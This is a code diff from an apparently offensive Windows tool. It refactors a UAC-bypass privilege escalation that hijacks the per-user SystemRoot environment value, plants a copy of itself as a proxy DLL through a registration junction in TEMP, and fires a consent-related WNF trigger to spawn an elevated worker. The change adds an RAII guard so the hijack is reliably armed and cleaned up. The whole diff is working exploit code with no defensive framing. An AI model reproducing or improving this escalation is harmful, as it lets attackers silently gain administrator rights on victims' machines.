@@ -364,14 +364,43 @@ void DeleteRegistrationJunction(const wchar_t* tempDir) {
     k.RemoveDirectoryW(linkPath);
 }
 
-// broadcast=true notifies top-level windows that HKCU\Environment changed.
-// HWND_BROADCAST wait is *per window* — never use SMTO_BLOCK with a large
-// timeout (N hung windows ⇒ N seconds). Cleanup does not need a broadcast.
-bool SetVolatileSystemRoot(const wchar_t* valueOrNull, bool broadcast) {
-    const AdvApis& adv = GetAdvApis();
+static void BroadcastEnvironmentChanged() {
     const U32Apis& u32 = GetU32Apis();
-    if (!adv.ready) return false;
+    if (!u32.ready) return;
+    wchar_t envName[32];
+    FillEnvironmentName(envName, 32);
+    // Per-window timeout; ABORTIFHUNG so hung HWNDs cannot stall us for seconds.
+    u32.SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+        (LPARAM)envName, SMTO_ABORTIFHUNG, 100, nullptr);
+}
 
+// Arm: write HKCU\Environment\SystemRoot. Do NOT broadcast — Explorer would
+// cache the hijack in its process environment and keep poisoning children even
+// after we delete the value.
+static bool ArmSystemRootHijack(const wchar_t* tempDir) {
+    const AdvApis& adv = GetAdvApis();
+    if (!adv.ready || !tempDir || !tempDir[0]) return false;
+    wchar_t envName[32];
+    FillEnvironmentName(envName, 32);
+    wchar_t rootName[32];
+    FillSystemRootName(rootName, 32);
+    HKEY hKey = nullptr;
+    if (adv.RegOpenKeyExW(HKEY_CURRENT_USER, envName, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+    LSTATUS st = adv.RegSetValueExW(hKey, rootName, 0, REG_SZ,
+        (const BYTE*)tempDir, (DWORD)((wcslen(tempDir) + 1) * sizeof(wchar_t)));
+    adv.RegFlushKey(hKey);
+    adv.RegCloseKey(hKey);
+    return st == ERROR_SUCCESS;
+}
+
+// Disarm: delete our SystemRoot override if present. Broadcast only when we
+// actually removed it — otherwise Explorer already has the real env.
+// Order with junction teardown: disarm BEFORE deleting TEMP\Registration.
+static bool DisarmSystemRootHijack() {
+    const AdvApis& adv = GetAdvApis();
+    if (!adv.ready) return false;
     wchar_t envName[32];
     FillEnvironmentName(envName, 32);
     wchar_t rootName[32];
@@ -381,24 +410,30 @@ bool SetVolatileSystemRoot(const wchar_t* valueOrNull, bool broadcast) {
     if (adv.RegOpenKeyExW(HKEY_CURRENT_USER, envName, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
         return false;
     }
-    LSTATUS st;
-    if (valueOrNull) {
-        st = adv.RegSetValueExW(hKey, rootName, 0, REG_SZ,
-            (const BYTE*)valueOrNull, (DWORD)((wcslen(valueOrNull) + 1) * sizeof(wchar_t)));
-    } else {
-        st = adv.RegDeleteValueW(hKey, rootName);
-        if (st == ERROR_FILE_NOT_FOUND) st = ERROR_SUCCESS;
+    LSTATUS st = adv.RegDeleteValueW(hKey, rootName);
+    if (st == ERROR_SUCCESS) {
+        adv.RegFlushKey(hKey);
+        adv.RegCloseKey(hKey);
+        BroadcastEnvironmentChanged();
+        return true;
     }
-    adv.RegFlushKey(hKey);
     adv.RegCloseKey(hKey);
-    if (st == ERROR_SUCCESS && broadcast && u32.ready) {
-        // lParam must be "Environment" (not the value name). Abort hung HWNDs;
-        // 100ms is enough for Explorer to refresh before we trigger WNF.
-        u32.SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
-            (LPARAM)envName, SMTO_ABORTIFHUNG, 100, nullptr);
-    }
-    return st == ERROR_SUCCESS;
+    return st == ERROR_FILE_NOT_FOUND;
 }
+
+// RAII: always disarm SystemRoot, even if bootstrap returns early / unwinds.
+struct SystemRootHijackGuard {
+    bool armed = false;
+    ~SystemRootHijackGuard() {
+        if (armed) {
+            DisarmSystemRootHijack();
+            armed = false;
+        }
+    }
+    void arm(const wchar_t* tempDir) {
+        armed = ArmSystemRootHijack(tempDir);
+    }
+};
 
 bool GetSelfModulePath(wchar_t* out, DWORD outLen) {
     HMODULE hSelf = nullptr;
@@ -515,6 +550,9 @@ bool BootstrapElevatedWorker() {
     if (!a.ready || !k.ready) return false;
     if (!EnsureIpcCreated()) return false;
 
+    // Drop a leftover override from a prior crash (no-op if none).
+    DisarmSystemRootHijack();
+
     ElevIpc& ipc = GetElevIpc();
     ResetEvent(ipc.hReady);
     InterlockedExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_IDLE);
@@ -530,7 +568,7 @@ bool BootstrapElevatedWorker() {
     wchar_t selfPath[MAX_PATH];
     if (!GetSelfModulePath(selfPath, MAX_PATH)) return false;
 
-    bool junctionOk = false, envOk = false;
+    bool junctionOk = false;
     bool result = false;
 
     wchar_t sys32Sub[32];
@@ -538,39 +576,42 @@ bool BootstrapElevatedWorker() {
     wchar_t proxyDll[64];
     FillProxyDll(proxyDll, 64);
 
-    do {
-        DeleteRegistrationJunction(tempDir);
-        if (!CreateRegistrationJunction(a, tempDir)) break;
-        junctionOk = true;
+    // Inner scope: SystemRoot must be disarmed (dtor) BEFORE the junction is
+    // removed, or COM+/Registration resolves to an empty TEMP\Registration.
+    {
+        SystemRootHijackGuard rootGuard;
+        do {
+            DeleteRegistrationJunction(tempDir);
+            if (!CreateRegistrationJunction(a, tempDir)) break;
+            junctionOk = true;
 
-        wchar_t sys32Dir[MAX_PATH * 2];
-        swprintf(sys32Dir, MAX_PATH * 2, L"%ls%ls", tempDir, sys32Sub);
-        if (!k.CreateDirectoryW(sys32Dir, nullptr)) {
-            if (GetLastError() != ERROR_ALREADY_EXISTS) break;
-        }
+            wchar_t sys32Dir[MAX_PATH * 2];
+            swprintf(sys32Dir, MAX_PATH * 2, L"%ls%ls", tempDir, sys32Sub);
+            if (!k.CreateDirectoryW(sys32Dir, nullptr)) {
+                if (GetLastError() != ERROR_ALREADY_EXISTS) break;
+            }
 
-        wchar_t proxyPath[MAX_PATH * 2];
-        swprintf(proxyPath, MAX_PATH * 2, L"%ls%ls%ls", tempDir, sys32Sub, proxyDll);
-        if (!k.CopyFileW(selfPath, proxyPath, FALSE)) break;
+            wchar_t proxyPath[MAX_PATH * 2];
+            swprintf(proxyPath, MAX_PATH * 2, L"%ls%ls%ls", tempDir, sys32Sub, proxyDll);
+            if (!k.CopyFileW(selfPath, proxyPath, FALSE)) break;
 
-        if (!SetVolatileSystemRoot(tempDir, true)) break;
-        envOk = true;
+            rootGuard.arm(tempDir);
+            if (!rootGuard.armed) break;
 
-        if (!TriggerUnifiedConsentWnf(a)) break;
+            if (!TriggerUnifiedConsentWnf(a)) break;
 
-        DWORD wr = WaitForSingleObject(ipc.hReady, UC83_WAIT_MS);
-        if (wr == WAIT_OBJECT_0 &&
-            WorkerProcessAlive(ipc.shm->helperPid) &&
-            InterlockedCompareExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_READY,
-                THIRDEYE_ELEV_STATUS_READY) == THIRDEYE_ELEV_STATUS_READY) {
-            result = true;
-        } else if (wr == WAIT_OBJECT_0 && WorkerProcessAlive(ipc.shm->helperPid)) {
-            result = true;
-        }
-    } while (false);
+            DWORD wr = WaitForSingleObject(ipc.hReady, UC83_WAIT_MS);
+            if (wr == WAIT_OBJECT_0 &&
+                WorkerProcessAlive(ipc.shm->helperPid) &&
+                InterlockedCompareExchange(&ipc.shm->status, THIRDEYE_ELEV_STATUS_READY,
+                    THIRDEYE_ELEV_STATUS_READY) == THIRDEYE_ELEV_STATUS_READY) {
+                result = true;
+            } else if (wr == WAIT_OBJECT_0 && WorkerProcessAlive(ipc.shm->helperPid)) {
+                result = true;
+            }
+        } while (false);
+    }
 
-    // Undo hijack without another HWND_BROADCAST (worker already spawned).
-    if (envOk) SetVolatileSystemRoot(nullptr, false);
     if (junctionOk) DeleteRegistrationJunction(tempDir);
     return result;
 }
@@ -713,4 +754,8 @@ bool Uc83QuerySessionState(int* readyOut, DWORD* pidOut) {
     if (readyOut) *readyOut = ready ? 1 : 0;
     if (pidOut) *pidOut = alive ? pid : 0;
     return true;
+}
+
+void Uc83DisarmSystemRoot(void) {
+    DisarmSystemRootHijack();
 }
